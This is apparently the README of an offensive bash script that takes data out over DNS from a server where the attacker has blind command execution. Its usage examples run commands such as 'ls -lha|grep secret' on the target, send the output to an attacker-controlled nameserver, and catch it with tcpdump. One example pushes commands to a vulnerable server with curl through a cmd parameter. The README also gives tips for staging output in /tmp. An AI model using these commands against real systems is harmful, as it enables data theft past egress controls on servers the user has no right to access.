# DNS Data Exfiltration

A bash script that automates the exfiltration of data over dns in case we have a blind command execution on a server where all outbound connections except DNS are blocked. The script is also compatible with exec style command execution (e.g. java.lang.Runtime.exec)

## Usage
1. Local testing for bash:
```bash
$ dns_data_exfiltration.sh -h whatev.er -d "dig @0 +tries=5" -x dispatcher.sh -c 'ls -lha|grep secret' -- stdbuf -oL tcpdump --immediate -l -i any udp port 53
```

Contents of dispatcher.sh:
> $@

2. powershell example where we ssh into our ns to get the incoming dns requests.
```bash
dns_data_exfiltration.sh -w -h yourdns.ns -d "Resolve-DnsName" -x dispatcher.sh -c 'gci | % {$_.Name}' -- stdbuf -oL ssh -i key user@HOST 'sudo tcpdump --immediate -l udp port 53'
```

Contents of dispatcher.sh
> curl https://vulnerable_server --data-urlencode "cmd=\${1}"

3. More information on the options
```bash
dns_data_exfiltration.sh --help'
```

### Comments
Currently the provided command gets executed multiple times on the server until all of its output is extracted. This behavior may cause problems in case that command is not idempotent (functionality or output-wise, e.g. process listing) or is time/resource intensive. 
A workaround to avoid running into issues for the aforementioned cases is to first store the command output into a file (e.g. /tmp/file) and then read that file.

### Todos
 - Concurrency in the data exfiltration loop